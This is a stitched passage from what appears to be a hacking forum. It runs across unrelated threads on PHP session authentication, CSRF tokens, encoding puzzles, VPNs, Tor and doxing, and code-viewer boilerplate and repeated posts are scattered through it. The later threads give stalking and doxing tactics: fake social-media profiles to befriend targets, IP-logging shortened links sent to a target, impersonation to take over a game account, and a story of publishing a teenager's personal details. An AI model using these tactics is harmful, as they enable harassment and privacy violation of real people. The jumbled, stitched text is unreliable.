change your browser? What if your browser updates itself? What if you get a new IP from your ISP every day? What if you live at two or more places with different IP's and or machines and or browsers?                       Edited by ande (Friday 2nd of September 2016 02:22:24 PM)
@ande   So after you have validated the users password with the hash in the database, you should be ok to use a class and store the users common data in some OOP format like you said? Then when validating you just check if that class has a user ID, if it does not then we do not approve that request?   The pseudo code code you used to validate the user, are you saying that you should store a token in the database when they login, match the user ID with a token and if it does then they are verified? Because what is the point in matching the user id stored in the session with the user id stored in the database, it will always be the same right?   The reason I added the use of the user agent, IP and password was to help protect against session hijacking. Say if someone steals the session ID cookie, if their IP or use agent changes it would ask for login again; I know the user agent can be faked but it is another layer of security someone has to get right.

The example I posted uses the user's ID as the identifier for which user is logged in, and thats totally okay. But if you use tokens instead, you can do some cool stuff like listing what sessions are registered on each user, their IP, their user agent, when they were last used and the option to kill sessions. But for basic stuff, just storing the user ID in $_SESSION is fine.   You will of course need to have tokens in their own table. Something like:  Code| id | user_id | token | reg_time | visit_time | ip | user_agent |            .CodeMirror {height: auto;}      var element = document.getElementById("code-xZHyVJ0IeI");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        I guess using the IP is an okay option to protect against session hijacking, but like I said, it comes with a price. Personally I don't think it's necessary as long as all security is done correctly. In other words, no XSS.   Here is a simplified and modified version of my Auth class wrapper. It handles the currently logged in user stuff. Keep in mind that I also use a ORM to make accessing database objects easier (like User and Session). But you should get the general idea.  Code: php  <?php    class Auth {        /**       * Holds the currently logged in user       */      private static $user = NULL;        /**       * Holds the currently logged in user's session       */      private static $session = NULL;          // ---------------------------------------------------------------------------      /**       * Initializes the currenty logged in user.       *       * Run this at a stratigic place early in your code:       *       *    Auth::init();       *       */      public static function init() {          // By default we attempt to load a user from session          Auth::loadFromSession();      }          // ---------------------------------------------------------------------------      /**       * Attempts to load the currently logged in user from session       *       */      public static function loadFromSession() {          // Check that we have user session          if(!isset($_SESSION['user'])) {              return;          }            // Try to find a session          $session = Session::where([['token', '=', $_SESSION['user']]]);          if(!$session) {              return;          }            // Try to load a user by the session's user ID          $user = User::findPK($session->user_id);          if($user) {              Auth::$user = $user;              Auth::$session = $session;          }      }          // ---------------------------------------------------------------------------      /**       * Returns true if the user is logged in       *       */      public static function isUser() {          return Auth::$user instanceof User;      }          // ---------------------------------------------------------------------------      /**       * Returns true if the user is not logged in       *       */      public static function isGuest() {          return !Auth::isUser();      }          // ---------------------------------------------------------------------------      /**       * Attempt to log a user in with credentials.       * This will result in sessions being set on both client side and       * database side if successful.       *       */      public static function loginUsingCredentials($username, $password) {          // You will want to add hashing, salt and stuff like that here somewhere            // Attempt to fetch user from username and password          $user = User::where([[              'username' => $username,              'password' => $password          ]]);            if($user) {                // Woop woop, correct username and password.              // Create a new session for the user and set it with $_SESSION              $newSession = Misc::genRandomStr(100);              $userAgent = ((isset($_SERVER['HTTP_USER_AGENT']))?$_SERVER['HTTP_USER_AGENT']:'Unknown');              Session::create(                  'user_id' => $user->id,                  'token' => $newSession,                  'reg_time' => time(),                  'visit_time' => time(),                  'ip' => $_SERVER['REMOTE_ADDR'],                  'user_agent' => $userAgent,              );                $_SESSION['user'] = $newSession;                // Return the good news              return TRUE;            }            // Nope          return FALSE;      }          // ---------------------------------------------------------------------------      /**       * Loads a user with a given ID and stores it as the current user       *       * No database changes       *       */      public static function loginUsingID($id) {          $user = User::findPK($id);

     }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });         Usage:   You always need to run the following somewhere. If you have structured you application correctly, this should be easy.  Code: php  <?php    Auth::init();    ?>            .CodeMirror {height: auto;}      var element = document.getElementById("code-gXBG4ClLtx");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });         This page is only accessable for members:  Code: php  <?php    if(Auth::isGuest()) {      die('Members only!');  }    ?>            .CodeMirror {height: auto;}      var element = document.getElementById("code-Lwh1zSP328");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });         This page is only accessable for guests:  Code: php  <?php    if(Auth::isUser()) {      die('Guests only!');  }    ?>            .CodeMirror {height: auto;}      var element = document.getElementById("code-Qo00RImQ8F");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });         This is how you access the currently logged in user's data  Code: php  <?php    $welcomeName = 'Guest';    if(Auth::isUser()) {      $welcomeName = Auth::getUser()->username;  }    echo('Welcome ' . $welcomeName . '!');    ?>            .CodeMirror {height: auto;}      var element = document.getElementById("code-XqSM1jYavU");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });         This is how you login  Code: php  <?php    if(Auth::isGuest()) {      die('You are already logged in!');  }    Auth::loginUsingCredentials($username, $password);    ?>            .CodeMirror {height: auto;}      var element = document.getElementById("code-uzztOhvPaD");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });         This is how you login using user ID (for testing or impersonating etc)  Code: php  <?php    Auth::loginUsingID(1); // Probably admin ID    ?>            .CodeMirror {height: auto;}      var element = document.getElementById("code-cdYuxjLgfG");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });         This is how you logout  Code: php  <?php    if(Auth::isUser()) {      die('You are not logged in!');  }    Auth::logout();    ?>            .CodeMirror {height: auto;}      var element = document.getElementById("code-XM7ftdraIP");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });         Keep CSRF and stuff in mind tho, this is not a part of this.

Thanks! This is really helpful.   Would you say that running the init function is acceptable to run inside a "loadAllScripts.php" file or at the top of every page where you need to authenticate the user.   Lastly, with CSRF... Does that just concern where the username and password come from, that you should check standard headers to verify the request is same origin and the CSRF token? I can't see anywhere else CSRF comes into place other than that?

I can't see anywhere else CSRF comes into place other than that?    The "loadAllScripts.php" file approach is pretty outdated. But yes, that would work.   Yes the CSRF part is to make sure the login request came from your site. You might or might not want to use a CSRF token for that. Depends on whether or not you want people to be able to login posting from other pages and scripts. On the logout you definitely want a CSRF token.    I have this CSRF class as well:  Code: php  <?php    /**   * Cross Site Request Forgery protection class.   *   */  class CSRF {        // ---------------------------------------------------------------------------      /**       * Singleton style initialize CSRF token       *       */      public static function init() {          // Check if session engine is started          if (session_status() == PHP_SESSION_NONE) {              throw new Exception('Configuration failure: PHP session engine not started!');

But I thnk I am going to change my CSRF class slightly in the near future.                       Edited by ande (Friday 2nd of September 2016 05:51:51 PM)
Basically then I should be including the code for the init function at the top of every page when needed and not bother with using a "loadAllScripts" file.   Do you think it is worth more using a single page application like EZ does rather than having multiple pages; then using a template engine to load the correct page for the user?   Thank you for your quick and quality responses!
Looks like this is only generating the form nonce once, ideally you're generating new tokens on every request
Quote by noncetonicLooks like this is only generating the form nonce once, ideally you're generating new tokens on every request   Whenever I check the HTML in my browser I can see that the form key in the form has changed. Or do you mean the key should change before or after the request? At the moment the key is generated and then output to HTML before the page reaches the user.
Ah cool yea that's what I was wondering about. Some people generate a single token for the entirety of the session and thus greatly minimizes the effectiveness of the CSRF protection

@Ande   So you are saying you can just use one token for many forms you may have on a page?

It's easier if you grab the ascii character code for the character and add 13. Then you can add logic to make sure things stay in the printable range.
Why not allow the user to define his own offset?

Pretty easy to solve. XD are just chasers, and should be taken out. The actual characters are represented by the two characters after the XD. The answer therefore should be 17 characters long.

Y1c2Y5ZjYzZmcz@Y3ZkYxY5Zj.YzZmZk  what then?
Think about what you would put after a dot in an email address. Think what you would put after an @ in an email address. That is all I am going to help you with.
swear to god, i have thought about it already, but i really don't know anything about cryptography.  as far as i am concerned, YzZmZk should be com, and Y3ZkYxY5Zj should be the company name. no more clue. if i should do the rest, pls tell me what should i study, thx
The letters in the cipher text should be treated in pairs.    If YzZmZk is "com", then asume that   Yz = c  Zm = o  Zk = m   Then take a look at YzZmZk again. Notice that one of the letter-pairs that was in "com", is also in YzZmZk -> Zk.   You already know that Zk translates to m, so that means that we now have the following:  *******@*m***.com   Now, what email provider has five letters, with G in second position, and then .com? Hm... what about... gmail.com?   You take it from here.
So you have something like *******@gmail.com. That means:  Y3 - g  Zk - m  Yx - a  Y5 - i  Zj - l   Yz - c  Zm - o  Zk - m  Now pay attention to Yz(c) andYx (a). "a" and "c" have the difference of 2. So as "x" (Yx) and "z" (Yz).  This is also correct with Zj(l) and Zk (m). I'll leave the rest to you. Maybe his name might help too.
i really appreciate ur help but i still don't know what are c2, cz, and i am not sure if Y1 is e.Funny thing is that the hacker give me another hint today, he said i should use base64, then hexadecimal something like that to crack. Do u know something about these?

You're correct that that string is the hash. It's also a SHA512 hash.   Cracking rigs are expensive to run especially for slower algorithms like SHA512. What's in it for me if I crack the hash.

The strings, the ones between the quotes, are most probably base64 encodings. On line 23, there are "++" and "==" which are good identifiers of base64.                       Edited by shady (Sunday 2nd of October 2016 05:22:48 PM)
Codestrings FILE | sed -n ',27h,'s/^CFG~//p',27h,' | openssl enc -d -base64 | gzip -d            .CodeMirror {height: auto;}      var element = document.getElementById("code-9IUeXB8jNu");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        From this it looks like base64 is being used. And as Shady has already mentioned the == characters would suggest this too.   The == characters are used as padding in base64. Since only the last string contains any padding it looks likely that these strings are meant to be concatenated together before decoding. The fact that previous strings are only 61 characters long would support this theory since base64 encoded strings should have a character count which is a multiple of 4.  Encoding something with base64 will never output 61 characters.    I've also noticed that after every 61 char string there is a 3 char string. Perhaps only these are to be concatenated to produce a 64 char string?   Sed is a stream editor which is being used to alter the input as it is being encoded, however I'm not familiar enough with regex to work out exactly what it is being used for here other than placing CFG~ at the start of each line.    Not sure if this will help any, but 27h is the hexadecimal representation of an apostrophe ( ' ) and 0Ah is the hex representation of a period ( . ).

The chances of a encrypted string having three of the same characters at the end of it, is virtually impossible, the very end AAA== doesn't make sense for any hash, cipher, or encryption that I'm aware of. I'm going to chalk this down as a honeypot. Even if this was base64 there would be no way to decode it because by the looks of it, its salted multiple times. This is either, one, fake. Or two, some encryption I've never seen before.
base64 identified but the most important is not possible to decode and our target is to do it (decode it) hex is out from this code only base64 and genius encryption
Quote by bondbenzbase64 identified but the most important is not possible to decode and our target is to do it (decode it) hex is out from this code only base64 and genius encryption   It can't be just base64.

The strings, the ones between the quotes, are most probably base64 encodings. On line 23, there are "++" and "==" which are good identifiers of base64.                       Edited by shady (Sunday 2nd of October 2016 05:22:48 PM)
Codestrings FILE | sed -n ',27h,'s/^CFG~//p',27h,' | openssl enc -d -base64 | gzip -d            .CodeMirror {height: auto;}      var element = document.getElementById("code-qOmBgkYSrf");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        From this it looks like base64 is being used. And as Shady has already mentioned the == characters would suggest this too.   The == characters are used as padding in base64. Since only the last string contains any padding it looks likely that these strings are meant to be concatenated together before decoding. The fact that previous strings are only 61 characters long would support this theory since base64 encoded strings should have a character count which is a multiple of 4.  Encoding something with base64 will never output 61 characters.    I've also noticed that after every 61 char string there is a 3 char string. Perhaps only these are to be concatenated to produce a 64 char string?   Sed is a stream editor which is being used to alter the input as it is being encoded, however I'm not familiar enough with regex to work out exactly what it is being used for here other than placing CFG~ at the start of each line.    Not sure if this will help any, but 27h is the hexadecimal representation of an apostrophe ( ' ) and 0Ah is the hex representation of a period ( . ).                        Edited by H3L1X (Sunday 2nd of October 2016 09:26:02 PM)
The chances of a encrypted string having three of the same characters at the end of it, is virtually impossible, the very end AAA== doesn't make sense for any hash, cipher, or encryption that I'm aware of. I'm going to chalk this down as a honeypot. Even if this was base64 there would be no way to decode it because by the looks of it, its salted multiple times. This is either, one, fake. Or two, some encryption I've never seen before.

Context would be great. Where did you get it from? Why do you want to decode it?   All I can tell you at this point is that it looks like hex and has multiple repeating patterns in it.
Count it (with a computer if you like). It might be a hashed string. So, if you really want to "unhash" this, use a rainbow table but not much recommended.                       Edited by shady (Saturday 1st of October 2016 08:57:46 PM)
The string or whatever is 940 characters. Which would be 3760 bits if it is hex and 7520 bits if it is text. So clearly not a hash, it is way too long.
Next time please include string in code blocks. Tldr.   Try your luck decoding or deciphering:  http://rumkin.com/tools/cipher/         Edited by 0E800 (Thursday 29th of September 2016 04:17:42 PM)
Output must be 100% text
To me, after some testing it seems as a list of emails.
Yep, it should be text with emails and contacts. What is decoding secuence? (maybe it's double encoding?)
But I thought you said output is 100% text. By text I understand that no characters should be included. Which means it can't be an email.    But it suspiciously looks like some kind of a list. Maybe you should add some more information like where you got it and other stuff that might be helpful.

Quote by RavenXFirst this code was encoded with base64, now it should be something harder (it's encoding puzzle )    What is the point of decoding/decrypting something for you IF you do not learn it. You can brag on other forums how you managed to decrypt / decode it, but still, you know you did not. Learn
Learn what? Whole cryptography course?    At this point it's more try and guess what encoding was used?     I tried a lot, only base16 gives some output.   Anyway this encoding uses only numbers 0-9 and lowercase letters a-z, any ideas?
It is obviously a link, so you just need to find the right letters. You can start from "uggc" = "http"... I'm not very good at cryptography too, anyway.

For your information, that QR code is from an old version and it is yet to be updated for a better challenge. Solving it was meant to be just a stepping atone to more fun and interesting challenges which will be implemented in time.   Hence you haven't scratched the surface as regards this challenge series.

Solving it was meant to be just a stepping atone to more fun and interesting challenges which will be implemented in time.   Hence you haven't scratched the surface as regards this challenge series.
I scanned the QR code and got this message:   dWdnYzovL3B1bnl5cmF0cmYucml2eW1iYXluYmV0L19fZGUuY3Vj   Decoded the message using Base64 (Learned how to do that from one of the c0ne's posts). I came to know about rot-13 algorithm from Mr. Robot TV series. But, How would I know that I should use Base64 to decode the message just by looking at it?

Honestly any laptop from the last 5 years will do
I agree with x_X, but i guess having a laptop with a decent CPU would be beneficial if you would like to run VM's and so forth
I have a 4 year old laptop, and I have no problem most of the time. But when it comes to virtualisation and emulation, my good old i3 CPU is really struggling and it's not comfortable at all when I need to use a Windows VM or emulate Android phones.   If you can afford it, you can check the Asus RoG (you don't need the most expensive ones though) they are built for gaming purposes so you will have no problem for programming and pentesting.

From Wikipedia : QuoteFurther mitigation comes from some of the security features built into newer versions of Android that may help in making exploitation of the Stagefright bug more difficult; an example is the address space layout randomization (ASLR) feature that was introduced in Android 4.0 "Ice Cream Sandwich" and fully enabled in Android 4.1 "Jelly Bean". The version of Android 5.1 "Lollipop" includes patches against the Stagefright bug.   What version of Android are you running in your test?

Been a long time since I did any application exploitation, nor was I ever very good at it. Hadn't heard of this ROP concept before.

Have you ever considered renting a VPS and installing openVpn on it instead of paying someone else to provide the service?   By configuring openVpn on your own server you can ensure that no logs are stored. Openvpn uses very little resources and can be run on even a low end server. You can rent a server capable of being used as a vpn for as little as $3 a month, which as far as I'm aware is cheaper than most vpn providers offer their services for. Have a look on lowendbox.com, they have some great offers.   This also allows gives you full control. You can choose what encryption is used, who is allowed to use it, and you don't need to share the servers bandwith with other users like you would on a commercial vpn where a lot of clients will be connected to the same server.   It may be a slight learning curve depending on your network/linux experience, but definitely worth it.   The only con I see is that you are responsible for fixing any problems. This could be seen as a pro too however depending on how good your current provider is at responding to problems.

Typical noob mistake, but you got to remember to redirect the host packets from the main DNS route to a spoofed one.

This is extremely generic, please take a second to better formulate your question.
Just wondering, how will you social engineer them when you don't know where they are?
I never followed a method, only intuition how to do stuff. Let me give you an example. There was a game known as Empire of Sports (now dead), and in that game there was a guy with nick mactkt. He payed for me and my friend premium account for some months. Now, I got into fight with a friend and wanted to hack his account, so what I did was quite simple. I created new character with name macktk (it's not tkt but ktk) and that's something that human brain can miss while reading. And so, he gave me his personal data when I told him that I will pay him another premium account. So, there is no a secret way or a method, you only have to find a good solution and take advantage of it.
Thanks CodeIllusionist. Sorry Kenjoe41 and noncetonic.    Basically, if I wanted to build up an extensive profile on a person, are there any good methods/services/tricks that would deliver me lots of information. Or any tricks in searching for information based on a person's name? In essence, 'digging up' information on a person.
Tools like Maltego/FOCA will work but really it depends on just how much information you are trying to get . I would also advise making fake Facebook profiles (as cute women/men depending on who you are targetting) and getting fake friends so that you can try to add your target and get more info. Same goes with LinkedIn and similar social networking sites.
interesting topic. i would like to know who that mystery person is. beware, you may fall in love with that person...hehe
Hello everyone,   somewhat new to the board but came across this, i was out to research recently about how to try and locate the ip address of someone who had created a fake profile via Facebook and were persistently private mailing me with obscene stuff, came across a decent answer which i have yet to put into practice however showing as a 2016 posting so recent enough to remain usable, i believe it was called hacker9 (google it and type "tracing fake Facebook profile", and you should get it in the top 3 results).   Basically it goes on to show that if you use i believe they referred to it as a redirect URL within which you had some sort of listener you would be able to ascertain their "user agent" data thus getting a decent amount of info, possibly enough to be able to start a successful profile on the target, this would however require the use of tinyurl or another link shorting service and some key words in a PM to the target (you can always bet on someones curiosity to get the better of them, play to their interests/ego).   Now the downside, if the person is knowledgable about TOR or uses anonymity to their benefit, (again a lot of people are ignorant to the use of this) you will encounter issues and may be stopped in your tracks unless you utilise specifics tools or other steps, I'm no pro or would i even goes far as to say i know a lot but google and a general insight into methods will drag up some pretty good info, sometimes even enough for your own template.   I will be putting this to use when i do a little more research into it but i felt it might be a good starting point for you also to have a look at, and decide where to effectivly go from there (unless your some sort of stalker, then you can forget everything iv wrote and go play with traffic XD)   Thanks and good day ^-^   T.

Does the page load at all or are you getting BANNED when you try logging?   I've used tor a few time it its working here.
Certain nodes may be blocked due to previous bad activity through that node. Honestly, you probably shouldn't be using Tor to login to anything you wouldn't want someone else logging into as well

Hello Evilzoners,   Anonymity is something about which I care very much, and it's very crucial that a hacker maintains his/her anonymity. For those seeking a "darker path," being anonymous is even more crucial, an important step in avoiding cuffed wrists. Achieving true anonymity online requires more than just Tor or VPNs. Many known hackers behind bars today were tracked down simply because they overestimated their anonymity; they didn't put much effort into remaining anonymous, Artem Vaulin being the latest example. You need to constantly look for where you are "slacking" so to say, and improve, because anonymity is a very broad, multi-faceted subject.   The most primary step is to secure yourself with your habits and trends online. Its basically how you behave on the internet, what websites you click, your language pattern (how you speak), what websites you are registered to, pretty much anything that is used to identify you, and how you behave towards those things.    Also, its a good practice to keep changing aliases. Though this would be of no use if you don't secure your browsing habits. When you're browsing the internet through your many aliases, it's paramount that no two aliases collide. This includes clear distinctions between language patterns, time zones, discussion topics, who you talk to, and what you do under each alias. Such diligence demands much skill, focus, and vigilance. Avoid any distraction that could potentially lead to the corruption of an alias.   My favourite topic is Social Engineering. It's is an art of persuasion. In order to hone this magnificent skill, one must know his target, who they talk to, their interests and hobbies, friends and families. Then, one must be able to effectively use this information against his target. In today's world, the IT Industry is a big part of our daily lives and there are many people capable of skills like Social Engineering. Under the right circumstances, a malicious Social Engineer could even dupe the best of us. I believe the weakest link in any system is man himself.   We're living in a world in which Internet can be a very dangerous place, and the dangers can be anywhere; websites, forums, chat rooms, and so on. You can't really believe anyone, not even Google, Apple and Microsoft!  -derspion         Edited by derspion (Thursday 4th of August 2016 12:46:57 PM)

An example is not to register on a forum with a name sharklasers782 and to register on your college board with the same name, because the users from a forum can run a search with your name and get your personal data. It would be a good practice to register on one service as Darlene, on the other like Charlotte and on the third as Janice, ideally with different emails

Edited by root (Friday 5th of August 2016 06:10:17 AM)
@root, the way you interact with people is noticeable. Maybe you fail to understand the fact that your typing trend can be used as a recognisable factor. Purposely making little mistakes while typing are helpful here. When it comes to changing timezones, you wouldn't want to calculate or look up the time in Germany when you can easily look it up on your system time. I mean to say that when you're disguising yourself, it is very important to keep the small yet deciding points in order.  You'll have to behave as normal and confident as possible.                       Edited by derspion (Friday 5th of August 2016 08:45:31 AM)
Don't want to be judgemental or anything, but that's kinda fucked up.   Can you please give me a scenario in which you recognize me on some other part of internet, based on a style of speaking and timezone?
Quote by KurajberDon't want to be judgemental or anything, but that's kinda fucked up.

If you truly want to make sure no one is thinking you are the same individual, you should type differently than you usually type. They won't even begin to think if this account they came across on eBay speaking very sophisticated is in some way connected to this account on craigslist, typing with basic grammar.   Timezone is something necessary as when you visit sites, some of them do record what timezone you are in.         Edited by derspion (Friday 5th of August 2016 01:09:38 PM)
Fail overflow:: Hold up - change my speech pattern, change my ward-robe, maybe you'd like me to practice the way of the shadow-warrior whilst im at it and get versed in contact poisons?   Mega-fail:: The reason it's so much fail is because the interwebs are full of so much misinformation and bull-shit, your only vulnerable from all the horse-shit because basically people buy into and eat horse-shit.   I only have to type in Fresh CC# on a search engine to get an idea of the scale of the fraud that currently infects the net, then I've only got to type in: Fresh TEEN PORN to get a feel for the web in general..   The whole world is seedy and full of horse-shit - unmasking TOR users.. I imagine that'll go a lot smoother now that Jacob Applebaum is no longer a maintainer but how about re-thinking your OS..   How about not using any library associated with the GLibC and opt for Libs that are time tested and proven..   It's a sad day, when you realise 95% of what you do on-line is surveiled by another ass hat who has no idea how technology work's.. It's even more sad when you read about the abuse being conducted by even more ass-hats to surveil society in general and expect you to just roll with it for there better advertising purposes.   Case's in Point: Microsoft :: Apple :: Google :: Yahoo :: the list goes on...   What I find eye opening is people who have embraced the idea of better.. ie: OpenSource find themselves targets to pin down the whale.. ie: Pin-Whale, a whale, that is for those less informed is how somebody with greedy manipulative intentions targets them to steal there money or at least thats the financial expression.   So the seedy under-belly continues, an instead of people experiancing a global wake up of sorts, they just flow along like Sheep!   More Linux, more Windows, more Apple, more Android...   Christ it makes you sick how little people appreciate they're being shat on!   NTP - network time protocol.. Pfft, im not bothered if some fuck-wit can see what time I logged on.. They cant read anything else, because technology much like people evolves, if your using Windows, Macintosh or Android then you have no explicit expectation of privacy, its in there own terms of service.   The part thats not in there terms of service is when you opt for non-commercial software such as:   FreeDOS  RISC OS  Oberon ETH  BlueBottle  Plan 9  Plan 9 Front  Nitros-9  Pico  Stali-Linux  Morpheus-Linux  RLSD3-Linux  Alpine-Linux   Or any number of other fringe distributions that are not intended for the over-all surveiling of society and it's communications at large, perpetrated by abusive corporations that just brazenly think they can get away with they're miriad of Bull-Shit to the rest of society at large...   Good strong security doesnt start with anonymising yourself with Onions!   It starts by telling large conglomerates that spy on you for over two years with SSL vulnerabilities to go fuck themselves!
if you know how to use Havij
There can be no ambiguity!? We will not be swayed by angry "Jihadists nor give in to there damands" ... "Now watch this drive!" Bush Jr.   Havij - Is that like an OS or something? Clearly if we're all in the goal of secure computing then I've got no problem calling a Jihadi a Bro.. But when it comes to killing everybody that does not agree with the philosophy of Muhammed the one true prophet then yeah I draw umbridge, but you know what, it's the fucking internet! So nobody really gives a flying fuck about your world view...   Will one thousand virgins be waiting for me in paradise? "Hot damn - I hope so, I could do with all that raw SEX!"

I may sound like a pleb. But, I have never really gone over this form of attack before.    Could someone explain to me how dox actually works and how such crucial information is acquired?
This topic has very little legitimate value except for prevention.  It is of use for penetration testing and for preventing more serious attacks.  Dox, from a hacking perspective, is any personal information.  It can be things like credit card numbers but it also refers simply to real names online.  Dox attacks require gathering information from making connections based on public data or stealing it.
If I were you, I would give a try to Google Dorking in order to dox someone, it's not difficult at all and you can get a lot of information from most people.   -- Slendeh
I have had a look at that before and found some decent info on the target but just not enough, you know.
Doxing is just searching for people's personal info on the internet, then posting it on the internet. Most people who get "doxed" couldn't care less anyway. For example: you google search me, then find my real name is actually Steve Harris, and I own http://www.yorkshirecomputers.com/   So, in terms of percentage, how bothered do you think I am about you (or a doxer) posting/sharing on the internet? Right. So, why is it done?  Doxing is mostly done for the benefit of the doxer. Maybe he/she has certain emotion or ego quarters to fill, or he/she will get a good reputation from people they know who think doxing is great. Actually, I'm struggling for reason on this.  There isn't a skill to doxing, it just google searching.   Of course there are some good tools, such as, recon-ng that do this much faster, but at the end of the day, getting the target to care is the hard part.  Think about how easy it would be to dox Mark Zuckerberg.
I see what you did there xD

Think about how easy it would be to dox Mark Zuckerberg.       Yeah, pretty much spot on. hahaha.. looking up peoples usernames or emails in google. Or simply checking if the person is using the same email/username on social media as he uses on forums, and they think its a huge dox when they find your real name on your official twitter account haha.
Yeah, what other said - it's basically information gathering that sometimes goes with social engineering when obtaining that information. And it's mostly for personal benefit, like making up a profile to make more precise guesses when bruting a password, or gathering up a profile about your girlfriend before going on a date (that is usually very easy lol).  To be more precise about the definition - it's not just finding a name and maybe a phone number, it's about building a profile, and d0x is just a l33t term for "profiling".
It's crucial to keep your information confidential. If someone gets it, and they got a grudge with you, you might just be in a world of hurt. As an example, a security researcher by the name of Brian Krebs was doxed, and he had crack cocaine sent to his house as well as swatted by a bunch of script-kiddies. Another example was when a female developer was doxed by another script-kiddie by the name of 'Weev' - and her life was basically ruined at that point.
Do you mean Weev who went to jail for "hacking" AT&T?
One time I was robbed by some kid a long time ago. So I went ahead and gathered as much info as possible. For example, name, address, phone number, Facebook, families Facebook's, wrote a little description on why he was being doxed (for being a thief) and then pasted it on pastebin for the world to see. I also sent it to him using a fake Facebook account. Not much damage was done but he did deactivate his Facebook until this day so I think he got my point lol.
Shouldn't this be in the anonymity & privacy section? OSINT != Hacking
Hello,  i have a question how could i connect 2tor on my vpn or more simple    TOR>then>VPN>maybe more or not...   Maybe even more anonymity be real anonymous on the web. any suggestion  cause i know some people told me just to make my own vpn on vps but it not really anonymous because they have your info unless i pay in bitcoin even tho im not sure what they can log in what not, btw, any of you know good offshore vps provider?   thank you
Hmm, If you want real anonymity I read a long tutorial on tor about how to be completely anonymous and that looked pretty legit. If you want I can dig it up for you.
Turn off the computer and set it on fire.    You are going to leave tracks somewhere. Real anonymity doesn't exist. What I would do is avoid Tor, use L2p instead. If you want to do illegal stuff don't even bother.    I generally use a VPS as a host for my own VPN server where I manage the logs. I create an IpSec session and from there on out I can control what logs are kept, and I do delete the logs every 20 mins. Using Tor is a dumb idea anyways.
I would agree with dmzero, although fire might be overkill it does certainly ensure that no one will find you on the internet with that machine. Most people believe tor makes their browsing the internet mostly, if not completely, anonymous, which is not the case. Tor uses an onion routing protocol which performs multiple levels of encryption to all data sent, before bouncing the information through a pseudo-random selection of relay points, decrypting a level of the encryption at each point until it reaches the final relay and completely decrypts the information it received, no longer knowing the initial source of the information. Although this sounds really cool and almost as if you're a ghost in the system, there is a slight flaw to the idea, which is, if you have access to one relay node, you effectively have access to all the nodes, or you could at least find them with a bit of time, and with all the nodes you control all the information, being able to trace and control what enters and which nodes they are sent through. So, yeah, if you're unlucky enough to have someone who knows what they're doing on the other end, you really won't be hiding much. But, if you're looking for anonymity, as dmzero said, the simplest way, and probably closest you can really get to true anonymity is to connect through an external or virtual vpn where you have control over the logs. Meaning even if the vpn is compromised, if the logs don't exist and you aren't still using it, there isn't too much to directly link you to it.
well thank anyway i will try but any of you got a real good up-to-date tutorial that i could use for vps>vpn  like DMzero said <delete the logs every 20 mins> how can i do this and how to manage a good server.  btw any of you know stuff about proxy, is it still useful for Anonymity? i know im asking a lot of question but im the kind of person whit a foil hat on.
Link below is the best I've found so far, it can get you through the process, but if you're not overly comfortable with linux or the command line it may cause a bit of trouble. As to deleting the logs automatically, there are a number of programs available online that can automate deleting and likely shredding files according to a user set interval, but many of them depend on the os your running.  https://www.bestvpn.com/blog/11447/roll-openvpn-server-vps-using-centos-6/   If you still want to run tor through a vpn I found a few links that can give you more information on it. The first and second links are mostly information so you get a better idea as to what you're doing. The third is a decent-ish guide on running tor with vpns, it's not the best, but it should help you understand what to do.  https://trac.torproject.org/projects/tor/wiki/doc/TorPlusVPN  https://www.bestvpn.com/blog/42672/using-vpn-tor-together/  https://thetinhat.com/tutorials/darknets/tor-vpn-using-both.html

What do you guys think about using tails for anonymity, is it alone good or are vpns better
Looks a little bit like whonix, if only a bit lighter and perhaps more user friendly, but it's a little hard to judge from just the docs. As far as I can tell, it should do fairly well if you're interested in anonymity, but if you do use tails I recommend not attempting to use a vpn alongside it. I could be wrong, but, looking around the docs, a vpn would likely cause tails to not function properly, or at the very least risk the anonymity of the system. So, it's fairly good if you're just browsing the web or performing fairly small or simplistic tasks, but for much more, you may want to consider alternatives. Also with vpns, you need to remember that whoever is hosting the ip for the vpn will have access to the information that passes through it. So, unless you trust the vpn provider, you may want to avoid using vpns as your only method of anonymity.

